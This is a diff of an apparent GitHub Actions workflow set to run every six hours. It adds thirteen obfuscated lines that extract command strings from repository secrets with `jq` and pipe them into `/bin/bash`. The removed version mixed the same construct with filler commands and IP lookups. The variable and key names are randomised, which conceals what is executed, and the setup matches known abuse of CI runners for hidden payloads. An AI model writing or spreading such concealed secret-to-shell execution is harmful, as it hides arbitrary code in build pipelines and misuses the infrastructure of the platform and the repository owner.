@@ -2,8 +2,8 @@ name: yangziyuan1962
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
-jobs:  # 26162
+    - cron: '5 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,29 +11,19 @@ jobs:  # 26162
       - uses: actions/checkout@v4
       - name: yangziyuan1962
         env:
-          e19460: ${{ secrets.e19460 }}
+          cmyyd394: ${{ secrets.cmyyd394 }}
         run: |
-          git branch -vv
-          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
-          echo $e19460 | jq -r .b28044 | /bin/bash
-          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
-          git pull -r
-          git remote -vv
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          test -d /tmp && echo "Tmp dir exists"
-          ps -ef | grep zxcy.fjijuihinfkd.781
-          uname -a
-          printf "shasum -a 256 of \$(date): $(printf "%s" "$(date)" | shasum -a 256)"
-          ping -c 10 github.com
-          echo "Version: $((1 + RANDOM % 5))"
-          ping -c 10 www.google.com
-          which printf
-          echo "Build $(date +%s)"
-          curl ipinfo.io
-          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          rm -rf tmp.temp.my.scrip.orc.zzz
-          curl ipinfo.io/ip
-          which brew
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          pushd ~ > /dev/null
-          echo "Random ID: $RANDOM$RANDOM"
+          echo $cmyyd394 | jq -r .tfeu47094 | /bin/bash
+          echo $ijn9055 | jq -r .vmw48 | /bin/bash
+          echo $qucn7 | jq -r .mb8 | /bin/bash
+          echo $vi15 | jq -r .nn506 | /bin/bash
+          echo $caq0 | jq -r .aesd53 | /bin/bash
+          echo $ehxx08396 | jq -r .b34504 | /bin/bash
+          echo $zjir0369 | jq -r .e4104 | /bin/bash
+          echo $oh15709 | jq -r .hu55 | /bin/bash
+          echo $vks8 | jq -r .cyabe03 | /bin/bash
+          echo $scj6825 | jq -r .jsm0 | /bin/bash
+          echo $f223 | jq -r .eu673 | /bin/bash
+          echo $fm80 | jq -r .ccmv2351 | /bin/bash
+          echo $s02239 | jq -r .awh9 | /bin/bash
+
